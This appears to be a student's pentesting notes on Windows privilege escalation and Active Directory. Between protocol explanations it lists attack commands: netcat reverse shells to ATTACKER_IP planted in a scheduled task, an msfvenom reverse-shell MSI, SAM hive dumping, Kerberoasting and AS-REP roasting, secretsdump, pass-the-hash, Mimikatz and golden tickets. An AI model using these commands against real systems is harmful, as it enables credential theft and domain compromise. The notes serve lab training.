# Windows Stuff

Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges.

- HKLM\SYSTEM\CurrentControlSet\Services\

whoami /priv

SAM and SYSTEM hashes, we can use the following commands:
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive

# Basics PS and CMD

Download files = `certutil.exe -urlcache -split -f "http://10.18.30.97/winpeas.exe" winpeas.exe`

## PS

cat = type
id = whoami
sudo = runas /user:admin /savecred cmd.exe
grep = findstr connectionString
permissions = icacls
config = sc qc apphostsvc
wget = wget path -O name
curl = Invoke-WebRequest
-d = -Body
-H = -Headers
chmod = icacls WService.exe /grant Everyone:F
man = Get-Help
find / -name root.txt = gci -r | where Name -Match 'root.txt'
grep -nri "." . = Get-ChildItem -Recurse _._ | Select-String -Pattern "foobar" | Select-Object -Unique Path
Get-Command = List all cmdlets, functions, aliases
Get-Command | Where-Object -Property CommandType -EQ 'Cmdlet' | Measure-Object = Count all cmdlets
2>&1>$null = 2>/dev/null

base64 -d = type text.txt | & {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($\_))}

## CMD

systemctl stop = sc stop windowsscheduler
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
schtasks /run /tn vulntask

## Password in usual spots

C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

## Powershell History

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

## Saved windows credentials

cmdkey /list
runas /savecred /user:admin cmd.exe

## IIS config

C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

## PuTTy

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

## Tasks

schtasks /query /tn vulntask /fo list /v
icacls c:\tasks\schtask.bat
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
schtasks /run /tn vulntask

## Revshell

Linux: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.200.111 LPORT=LOCAL_PORT -f msi -o malicious.msi
Windows: msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
Windows cmd:
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
C:\> schtasks /run /tn vulntask

# AD

## LAPS

Local Administrator Password Solution
password is:
• Unique on each managed computer
• Randomly generated
• Securely stored in AD infrastructure
Solution is built upon just AD infrastructure, so there is no need to install and support other technologies.
Solution itself is a Group Policy Client Side Extension that is installed on managed machines and performs all management tasks
Management tools delivered with the solution allow for easy configuration and administration.

Core of the solution is GPO Client side Extension (CSE) that performs the following tasks during GPO update:
• Checks whether the password of local Administrator account has expired or not
• Generates the new password when old password expired or is required to be changed prior to expiration
• Changes the password of Administrator account
• Reports the password to password Active Directory, storing it in confidential attribute with computer account in AD
• Reports the next expiration time to Active Directory, storing it in confidential attribute with computer account in AD
• Password then can be read from AD by users who are allowed to do so
• Password can be forced to be changed by eligible users

Solution features include:
• Security:
◦ Random password that automatically regularly changes on managed machines
◦ Effective mitigation of Pass-the-hash attack
◦ Password is protected during the transport via Kerberos encryption
◦ Password is protected in AD by AD ACL, so granular security model can be easily implemented
• Manageability
◦ Configurable password parameters: age, complexity and length
◦ Ability to force password reset on per-machine basis
◦ Security model integrated with AD ACLs
◦ End use UI can be any AD management tools of choice, plus custom tools (PowerShell and Fat client) are provided
◦ Protection against computer account deletion
◦ Easy implementation and minimal footprint

Solution has the following requirements:
• Active Directory:
◦ Windows 2003 SP1 and above
• Managed machines:
◦ Windows Vista with current SP or above; x86 or x64
◦ Windows 2003 with current SP and above; x86 or x64 (Itanium not supported)
• Management tools:
◦ .NET Framework 4.0
◦ PowerShell 2.0 or above

## Tools

enum4linux -A ip
bloodhound

# If Chrome is not playing audio

HKCU\Software\Microsoft\Internet Explorer\LowRegistry\Audio\PolicyConfig\PropertyStore
Ctrl-F "chrome"
Delete

# RDP

`xfreerdp `

# Active Directory

AD = Collection of machines and servers connected inside of domains, that are part of a bigger forest of domains.

AD functioning bits and pieces =

- Domain Controllers
  - Windows Server that has Active Directory Domain Services installed and has been promoted to a domain controller in the forest.
    - Holds the AD DS data store
      - Contains the NTDS.dit - A database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users
      - Stored by default in %SystemRoot%\NTDS
      - Accessible only be the domain controller
    - Handles authentication and authorization services
    - Replicate updates from other domain controllers in the forest
    - Allows admin access to manage domain resources
- Forests, Trees, Domains
  - Defines everything
  - Collection of one or more domain trees inside of an AD network. It is what categorizes the parts of the network as a whole.
  - Trees - A hierarchy of domains in AD DS
  - Domains - Used to group and manage objects
  - Organizational Units - Containers for groups, computers, users, printers and other OUs
  - Trusts - Allows users to access resources in other domains
  - Objects - users, groups, printers, computers, shares
  - Domain Services - DNS Server, LLMNR, IPv6
  - Domain Schema - Rules for object creation
- Users + Groups
  - Default groups: Administrators, guest
  - Users:
    - Domain Admins: Big boss
    - Service Accounts: Not often used, except for server maintenance, they are required by Windows for SQL to pair a service with a service account
    - Local Administrators: Can make changes to local machines as an admin and may even be able to control other normal users, but cant access the domain controller
    - Domain users: Everyday users. They can log in to the machines they have auth to access and might have admin rights to machines
  - Groups:
    - Domain controllers: All domain controllers in the domain
    - Domain Guests: All domain guests
    - Domain Users: All domain users
    - Domain computers: All workstations and servers joined to the domain
    - Domain Admins: Designated admins of the domain
    - Enterprise admins: Designated admins of the enterprise
    - Schema admins: Designated admins of the schema
    - DNS admins: DNS admin group
    - DNS update proxy: DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers)
    - Allowed RODC Password Replication Group: Members in this group can have their passwords replicated to all read-only domain controllers in the domain
    - Group Policy Creator Owners - Members in this group can modify group policy for the domain
    - Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
    - Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
    - Cert Publishers - Members of this group are permitted to publish certificates to the directory
    - Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain
    - Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise
    - Key Admins - Members of this group can perform administrative actions on key objects within the domain.
    - Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest.
    - Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned.
    - RAS and IAS Servers - Servers in this group can access remote access properties of users
- Trusts
  - Domain Trusts Overview: Possible to abuse the trusts in order to move laterally throughout the network
    - Directional: The direction of the trust flows from a trusting domain to a trusted domain
    - Transitive: The trust relationship expands beyond just two domains to include other trusted domains
- Policies
  - Dictates how the server operates and what rules, like domain groups but instead of permissions they contain rules.
  - Big factor for attackers when enumerating an active directory network.
    - You can disable windows defender on all machines on the domain
    - You can digitally sign communication, disable or enamble smb signing on the domain controller
- Domain Services
  - Services that the domain controller provides to the rest of the domain or tree. Default domain services:
    - LDAP: Lightweight Directory Access Protocol, provides communication between applications and directory services
    - Certificate Services: Allows the domain controller to create, validate, and revoke public key certificates
    - DNS, LLMNR, NBT-NS: Domain Name Services for identifying IP hostnames
  - Domain Authentication Overview:
    - Most important and vulnerable part of AD: The authentication protocols set in place.
    - 2 types of authentication in place for AD: NTLM and Kerberos
      - Kerberos: The default authentication service for AD uses ticket-granting tickets and service tickets to authenticate users and give users access to resources across the domain.
      - NTLM: Default Windows authentication protocol uses an encrypted challenge/response protocol
- Azure AD:
  - Windows Server AD - Azure AD
  - LDAP - Rest APIs
  - NTLM - OAuth/SAML
  - Kerberos - OpenID
  - OU Tree - Flat Structure
  - Domains and Forests - Tenants
  - Trusts - Guests
-

Why = Allows for control and monitoring of users computers through a single domain controller. A single user can sign in to any computer on the active directory network and have access to their files and folders in the server and locally. So it becomes possible to log in to any machine without having to set up multiple users on a machine.

Physical ad = On-premise machines, anything from domain controllers to storage servers to domain user machines.

# Kerberos

Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

- Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
- Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
  Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
- Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
- Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
- KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
- Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
- Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
- Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
- Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

## Pre authentication

AS-REQ: The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

## TGT

In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

## ST

Two parts:

- Service portion: User details, session key, encrypts the ticket with the service account NTLM hash
- User portion: Validity timestamp, session key, encrypts with the tgt session key

## Kerberos Authentication Overview

AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
AP-REP - 6.) The service grants access

## Attack privilege requirements

Kerbrute Enumeration - No domain access required
Pass the Ticket - Access as a user to the domain required
Kerberoasting - Access as any user required
AS-REP Roasting - Access as any user required
Golden Ticket - Full domain compromise (domain admin) required
Silver Ticket - Service hash required
Skeleton Key - Full domain compromise (domain admin) required

## Enumeration

Kerbrute = https://github.com/ropnop/kerbrute/releases
User.txt = https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt
`kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local /usr/share/wordlists/AD/User.txt`

## Harvesting tickets

`Rubeus.exe harvest /interval:30`
`echo 10.10.183.221 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
`Rubeus.exe brute /password:Password1 /noticket`
OR remote
`sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.131.2 -request`

`Rubeus.exe asreproast`
`hashcat -m 18200 hash.txt pass.txt`

Mimikatz = Post exploitation tool, dumping user credentials

# Windows Post Exploitation

TLD = Top Level Domain
KDC = Key Distribution Center
SPN = Service Principal Name
TGS = Service Ticket

## Enumeration

`powershell -ep bypass` <-- Bypass execution policy of powershell
`. .\PowerView.ps1` <-- Start powerview

Enumerate Domain Users=`Get-NetUser | select cn`
Enumerate Domain Groups=`Get-NetGroup -GroupName *admin*`

Cheat sheet at https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

# Method

1. Port scanning
   1. Find DNS Domain name, add it to etc/hosts
2. Kerberos enumeration
   1. `kerbrute --dc domain.local -d domain.local userlist.txt`
   2. `GetNPUsers.py domain.local/username -no-pass`
   3. If ticket is granted
      1. Crack ticket
         1. `hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`
         2. `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
3. SMB enumeration
   1. smbclient -L \\\\ip\\ -U username
   2. crack hashes
   3. Get a certificate.pem file
   4. Get a key.pem file
   5. Use evil-winrm to get a foothold
4. `secretsdump.py domain.local/username:'password'@domain.local -just-dc`
   1. DRSUAPI method to get NTDS.DIT secrets
   2. Hash = last :
   3. `psexec.py administrator@ip -hashes <hash>`
   4. `evil-winrm administrator@ip -H hash`

# Post exploitation Method

1. `powershell -ep bypass`
2. Start powerview `. .\Downloads\PowerView.ps1`
3. Enumerate domain users `Get-NetUser | select cn`
4. Enumerate domain groups `Get-NetGroup -GroupName *admin*`
5. Enumerate SMB shares `Get-SmbShare`
6. List OS inside the computer `Get-NetComputer -fulldata | select operatingsystem`

## Mimikatz

privilege::debug
20 ok = Administrator

lsadump::lsa /patch

## Golden Ticket attack

lsadump::lsa /inject /name:krbtgt
kerberos::golden /user: /domain: /sid: /krbtgt: /id:

# NTLM

New Technology Lan Manager
Protocol used to authenticate the users in the AD.

1. User requests access
2. Server sends challenge
3. Client sends response
4. Server sends challenge and response to DC
5. DC compares challenge and response for authentication
6. Server sends DC's response

# LDAP

Lightweight Directory Access Protocol
Similar to NTLM except the application directly verifies the users credentials.
Popular with 3rd party applications that integrate with AD. Such as:

- Gitlab
- Jenkins
- Custom developed web applications
- Printers
- VPNs

1. User sends printing requests with AD user and password
2. Printer uses its AD credentials to create and LDAP bind request
3. DC provides bind response
4. Printer requests LDAP user search
5. User search response
6. LDAP Bind request with user credentials
7. Server sends bind response
8. User is authenticated and print job is accepted.

## LDAP pass-back attack

Configure LDAP configuration such as IP or hostname of the LDAP server. Then intercept authentication to recover LDAP credentials.

1. sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
2. sudo dpkg-reconfigure -p low slapd
3. Create olcSaslSecProps.ldif file

```ldif
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

4. sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
5. nc -lnvp 389
6. /settings and put your ip and send request
7.

## SMB

SMB governs everything from inter-network file-sharing to remote administration. Even the out of paper alert is from the smb protocol.

A responder usually will attempt to poison any Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Servier (NBT-NS) and Web Proxy Auto-Discovery (WPAD) requests that are detected. On large networks, these protocols allow hosts to perform their own local DNS resolution for all hosts on the same local network. Rather than overburdening network resources such as the DNS servers, hosts can first attempt to determine if the host they are looking for is on the same local network by sending out LLMNR requests and seeing if any hosts respond. The NBT-NS is the precursor protocol to LLMNR, and WPAD requests are made to try and find a proxy for future HTTP(s) connections.

Rouge devices would also receive these requests.
Responder can be used to intercept the challenges

# MDT & SCCM

Microsoft Deployment Toolkit
Assists with automating the deployment of Microsoft Operating Systems.

SCCM: System Center Configuration Manager
Manages updates for all Microsoft applications, services, and OS.

## PXE Boot

Preboot Execution Environment
Integrated with DHCP

1. User sends DHCP discover
2. Server sends DHCP Offer
3. User sends DHCP request
4. Server sends DHCP Ack
5. Client performs Boot Service Discover
6. Server Ack (sends Boot information)
7. Client requests PXE boot via TFTP
8. Server delivers PXE boot via TFTP

PXE Boot Image can then be injected with a privilege escalation vector, such as Admin access to the OS once boot is completed. Can also perform password scraping attacks to recover AD credentials used during the install.

# Enumeration

## Runas

`runas /netonly /user:<domain>\<username> cmd.exe`
List SYSVOL

- Folder on all domain controllers
- Shared folder storing Group Policy Objects and information along with other domain related scripts.
- Essential component for AD since it delivers the GPOs to all computers on the domain

First configure DNS

```powershell
$dnsip = "<DC IP>"
$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
```

IP vs Hostnames

- Hostnames
  - First attempts kerberos authentication
- IP
  - Uses NTLM for authentication

## CMD enumeration

net accounts /domain
net users /domain
net user "Guest" /domain
net groups /domain
net group "Admins" /domain

## PS enumeration

`Get-ADUser -Identity <name> -Server <server> -Properties *`
`Get-ADGroup -Identity <name> -Server <server>`
`Get-ADGroupMember -Identity <name> -Server <server>`
`Get-ADObject -Filter "whenchanged -eq <x>" -includeDeletedObjects -Server <server>`
`Get-ADDomain -Server <server>`
`Set-ADAccountPassword -Identity <name> -Server <server> -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)`

# Bloodhound

Sharphound.ps1 runs in memory, meaning that it can avoid AV detection.
AzureHound.ps1

1. Run Sharphound
2. Download zip file to attacker machine
3. Start neo4j console
4. Start bloodhound
5. Drag and drop

```

```

[Pass-The-Hash](https://labs.withsecure.com/blog/pth-attacks-against-ntlm-authenticated-web-applications/)
[Dehashed](https://www.dehashed.com/)

# Lateral movement

Local accounts part of the local Administrators group
Domain accounts part of the local Administrators group

By default, local administrators won't be able to remotely connect to a machine and perform administrative tasks unless using an interactive session through RDP. Windows will deny any administrative task requested via RPC, SMB or WinRM since such administrators will be logged in with a filtered medium integrity token, preventing the account from doing privileged actions. The only local account that will get full privileges is the default Administrator account.

Domain accounts with local administration privileges won't be subject to the same treatment and will be logged in with full administrative privileges.
